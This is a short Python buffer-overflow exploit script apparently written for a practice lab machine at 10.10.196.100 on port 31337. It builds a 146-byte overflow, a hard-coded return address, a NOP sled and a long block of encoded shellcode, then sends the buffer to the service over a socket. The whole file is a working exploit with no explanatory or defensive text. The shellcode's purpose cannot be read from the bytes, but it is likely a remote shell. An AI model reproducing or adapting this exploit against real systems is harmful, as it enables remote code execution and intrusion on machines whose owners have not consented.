#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.196.100"

port = 31337
timeout = 5

#eip offset 146
#esp offset 2814
offset = 146
of = "A" *offset 
retn = "\xc3\x14\x04\x08"
# Bad chars \x00\x0a
payload = ("\xdd\xc1\xd9\x74\x24\xf4\xb8\x6c\x20\x72\xc8\x5a\x29\xc9\xb1"
"\x5e\x31\x42\x1a\x03\x42\x1a\x83\xea\xfc\xe2\x99\xdc\x9a\x47"
"\x61\x1d\x5b\x38\x50\xcf\xd2\x5d\xf6\x64\xb6\xad\x7d\x28\x3b"
"\x45\xd3\xd9\x72\xa6\xdc\x56\x3e\x7e\x69\xea\x97\x4f\xad\xa7"
"\xd4\xce\x51\xba\x08\x31\x68\x75\x5d\x30\xad\xc3\x2b\xdd\x63"
"\x83\x58\x73\x93\xa0\x1d\x48\x92\x66\x2a\xf0\xec\x03\xed\x85"
"\x40\x0d\x3e\xee\x10\x15\x35\xa9\x80\x24\x9a\x1a\x45\xef\x68"
"\xa7\x0c\x7b\xa4\x5c\x8f\xad\xf4\x9d\xbe\x91\x36\xae\xcd\xbd"
"\xb8\xf6\xf5\x5d\xcf\x0c\x06\xe3\xc8\xd6\x75\x3f\x5c\xc9\xdd"
"\xb4\xc6\x2d\xdc\x19\x90\xa6\xd2\xd6\xd6\xe1\xf6\xe9\x3b\x9a"
"\x02\x61\xba\x4d\x83\x31\x99\x49\xc8\xe2\x80\xc8\xb4\x45\xbc"
"\x0b\x10\x39\x18\x47\xb2\x2c\x1c\xa8\x4d\x51\x40\x3f\x82\x9c"
"\x7b\xbf\x8c\x97\x08\x8d\x13\x0c\x87\xbd\xdc\x8a\x50\xb7\xca"
"\x2c\x8e\x7f\x9a\xd2\x2f\x80\xb3\x10\x7b\xd0\xab\xb1\x04\xbb"
"\x2b\x3d\xd1\x56\x21\xa9\xd0\xae\xea\x33\x8d\xac\x14\x55\xc5"
"\x38\xf2\x05\x85\x6a\xaa\xe5\x75\xcb\x1a\x8e\x9f\xc4\x45\xae"
"\x9f\x0e\xee\x45\x70\xe7\x47\xf2\xe9\xa2\x13\x63\xf5\x78\x5e"
"\xa3\x7d\x89\x9f\x6a\x76\xf8\xb3\x9b\xe1\x02\x4b\x5c\x84\x02"
"\x21\x58\x0e\x54\xdd\x62\x77\x92\x42\x9c\x52\xa0\x84\x62\x23"
"\x91\xff\x55\xb1\x9d\x97\x99\x55\x1e\x67\xcc\x3f\x1e\x0f\xa8"
"\x1b\x4d\x2a\xb7\xb1\xe1\xe7\x22\x3a\x50\x54\xe4\x52\x5e\x83"
"\xc2\xfc\xa1\xe6\x50\xfa\x5e\x75\x7f\xa3\x36\x85\x3f\x53\xc7"
"\xef\xbf\x03\xaf\xe4\x90\xac\x1f\x05\x3b\xe5\x37\x8c\xaa\x47"
"\xa9\x91\xe6\x06\x77\x92\x05\x93\x88\xe9\x66\x24\x69\x0e\x6f"
"\x41\x69\x0f\x8f\x77\x55\xc6\xb6\x0d\x98\xdb\x8c\x0e\x07\xf1"
"\xf8\xa6\x9e\x90\x40\xab\x20\x4f\x86\xd2\xa2\x65\x77\x21\xba"
"\x0c\x72\x6d\x7c\xfd\x0e\xfe\xe9\x01\xbc\xff\x3b")
padding = "\x90"*16
buf = of + retn + padding + payload

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(bytes(buf+"\r\n", "latin-1"))
s.close()
print("Done!")